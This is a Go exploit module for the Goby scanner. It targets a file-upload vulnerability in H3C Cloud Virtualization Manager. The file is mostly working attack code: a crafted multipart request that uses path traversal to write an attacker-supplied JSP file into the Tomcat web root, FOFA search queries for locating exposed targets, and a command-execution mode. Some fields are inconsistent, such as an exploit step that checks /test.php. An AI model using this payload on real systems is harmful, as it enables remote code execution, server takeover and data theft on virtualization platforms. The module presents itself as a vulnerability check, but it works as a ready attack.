package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "H3C CVM /cas/fileUpload/fd File Upload Vulnerability",
    "Description": "<p>H3C Cloud Virtualization Manager (CVM) is a cloud virtualization management platform. This vulnerability exists in the file upload functionality, allowing attackers to upload specially crafted files (e.g., JSP files) to execute malicious code on the server, potentially leading to full server control.</p>",
    "Product": "H3C CVM",
    "Homepage": "https://www.h3c.com/",
    "DisclosureDate": "2024-06-26",
    "PostTime": "2024-12-04",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"checkEntryServlet\" || server=\"H3C-CVM\" || (banner=\"H3C-CVM\" && banner=\"Server: \")",
    "GobyQuery": "body=\"checkEntryServlet\" || server=\"H3C-CVM\" || (banner=\"H3C-CVM\" && banner=\"Server: \")",
    "Level": "3",
    "Impact": "<p>This vulnerability allows attackers to upload malicious files and execute arbitrary code on the server, potentially leading to full server control, data leakage, and system crashes.</p>",
    "Recommendation": "<p>It is recommended to upgrade H3C CVM to the latest version immediately, strictly check file types in the file upload functionality, and prohibit uploading executable script files. Additionally, use security measures such as WAF (Web Application Firewall) to prevent the execution of malicious requests.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/143570843"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cas/fileUpload/fd",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=WebKitFormBoundary269520967239406871642430066855"
                },
                "data_type": "text",
                "data": "--WebKitFormBoundary269520967239406871642430066855\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{{FILENAME}}}\r\n--WebKitFormBoundary269520967239406871642430066855\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{FILENAME}}}\"\r\nContent-Type: image/png\r\n\r\n{{{CONTENT}}}\r\n--WebKitFormBoundary269520967239406871642430066855--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH|define|text|/cas/js/lib/buttons/{{{FILENAME}}}"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.7",
    "Translation": {
        "CN": {
            "Name": "H3C CVM /cas/fileUpload/fd 文件上传漏洞",
            "Product": "H3C CVM",
            "Description": "<p>H3C Cloud Virtualization Manager (CVM) 是一款云虚拟化管理平台。该漏洞存在于文件上传功能中，攻击者可以通过上传特制的文件（如 JSP 文件），在服务器上执行恶意代码，进而可能导致服务器被完全控制。</p>",
            "Recommendation": "<p>建议立即升级 H3C CVM 至最新版本，并在文件上传功能中严格检查文件类型，禁止上传可执行脚本文件。同时，采用 WAF（Web 应用防火墙）等安全措施，防止恶意请求的执行。</p>",
            "Impact": "<p>该漏洞允许攻击者上传恶意文件并在服务器上执行任意代码，可能导致服务器被完全控制、数据泄露和系统崩溃等严重后果。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "H3C CVM /cas/fileUpload/fd File Upload Vulnerability",
            "Product": "H3C CVM",
            "Description": "<p>H3C Cloud Virtualization Manager (CVM) is a cloud virtualization management platform. This vulnerability exists in the file upload functionality, allowing attackers to upload specially crafted files (e.g., JSP files) to execute malicious code on the server, potentially leading to full server control.</p>",
            "Recommendation": "<p>It is recommended to upgrade H3C CVM to the latest version immediately, strictly check file types in the file upload functionality, and prohibit uploading executable script files. Additionally, use security measures such as WAF (Web Application Firewall) to prevent the execution of malicious requests.</p>",
            "Impact": "<p>This vulnerability allows attackers to upload malicious files and execute arbitrary code on the server, potentially leading to full server control, data leakage, and system crashes.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|jsp",
        "VUL_URL": "define|variable|/cas/fileUpload/fd"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}